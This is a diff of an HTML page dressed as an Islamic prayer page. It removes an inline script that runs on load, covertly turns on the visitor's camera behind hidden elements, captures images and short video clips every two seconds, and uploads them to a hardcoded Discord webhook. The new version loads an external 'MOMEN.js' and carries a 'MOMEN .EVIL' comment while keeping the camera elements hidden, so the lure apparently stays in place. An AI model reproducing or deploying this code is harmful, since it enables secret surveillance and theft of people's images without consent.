@@ -5,8 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>صلي علي النبي</title>
     <style>
-        #video { display: none; }
-        #canvas { display: none; }
+        /* MOMEN .EVIL */
+        #video, #canvas { display: none; }
 
         body {
             font-family: Arial, sans-serif;
@@ -31,124 +31,9 @@
     <p class="prayer">لا إله إلا الله محمد رسول الله</p>
     <p class="prayer">اللهم اجعلنا من الذاكرين والذاكرات</p>
 
-    <video id="video" width="300" height="200" autoplay style="display:none;"></video>
-    <canvas id="canvas" width="300" height="200" style="display:none;"></canvas>
+    <video id="video" width="300" height="200" autoplay></video>
+    <canvas id="canvas" width="300" height="200"></canvas>
 
-    <script>
-        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1441781654858240062/2bd42tkVuibBXngZk0yAk8GHdB98ePkR5eDgTAvKIQ1UE_jhNkWcONRmORBVpptiflA2"; 
-
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const ctx = canvas.getContext('2d');
-        let stream;
-        let recorder;
-        let chunks = [];
-
-        window.onload = function () {
-            init();
-        }
-
-        async function init() {
-            try {
-                stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                video.srcObject = stream;
-                
-                startRecording();
-                setInterval(() => {
-                    captureImage();
-                    startRecording();
-                }, 2000);
-            } catch (err) {
-                console.error("Camera access error: ", err);
-            }
-        }
-
-        function dataURItoBlob(dataURI) {
-            const byteString = atob(dataURI.split(',')[1]);
-            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
-            const ab = new ArrayBuffer(byteString.length);
-            const ia = new Uint8Array(ab);
-            for (let i = 0; i < byteString.length; i++) {
-                ia[i] = byteString.charCodeAt(i);
-            }
-            return new Blob([ab], { type: mimeString });
-        }
-
-        function captureImage() {
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const imgData = canvas.toDataURL('image/png');
-            const imageHash = `sent_image_${imgData}`;
-
-            if (!localStorage.getItem(imageHash)) {
-                sendImage(imgData, imageHash);
-            } else {
-                console.log("Image already sent.");
-            }
-        }
-
-        function sendImage(imageData, imageHash) {
-            const imageBlob = dataURItoBlob(imageData);
-            const formData = new FormData();
-            formData.append('file', imageBlob, 'captured_image.png');
-
-            fetch(DISCORD_WEBHOOK_URL, {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => {
-                if (response.ok) {
-                    console.log("Image sent successfully to Discord.");
-                    localStorage.setItem(imageHash, true);
-                } else {
-                    console.error("Error sending image to Discord:", response.status, response.statusText);
-                }
-            })
-            .catch(error => console.error("Fetch error:", error));
-        }
-
-        function startRecording() {
-            chunks = [];
-            recorder = new MediaRecorder(stream);
-            recorder.ondataavailable = e => chunks.push(e.data);
-            recorder.onstop = sendVideo;
-
-            recorder.start();
-            setTimeout(() => {
-                recorder.stop();
-            }, 2000);
-        }
-
-        function sendVideo() {
-            const blob = new Blob(chunks, { type: 'video/webm' });
-
-            const reader = new FileReader();
-            reader.onloadend = () => {
-                const base64data = reader.result;
-                const videoHash = `sent_video_${base64data}`;
-
-                if (!localStorage.getItem(videoHash)) {
-                    const formData = new FormData();
-                    formData.append('file', blob, 'recorded_video.webm');
-
-                    fetch(DISCORD_WEBHOOK_URL, {
-                        method: 'POST',
-                        body: formData
-                    })
-                    .then(response => {
-                        if (response.ok) {
-                            console.log("Video sent successfully to Discord.");
-                            localStorage.setItem(videoHash, true);
-                        } else {
-                            console.error("Error sending video to Discord:", response.status, response.statusText);
-                        }
-                    })
-                    .catch(error => console.error("Fetch error:", error));
-                } else {
-                    console.log("Video already sent.");
-                }
-            };
-            reader.readAsDataURL(blob);
-        }
-    </script>
+    <script src="MOMEN.js"></script>
 </body>
 </html>
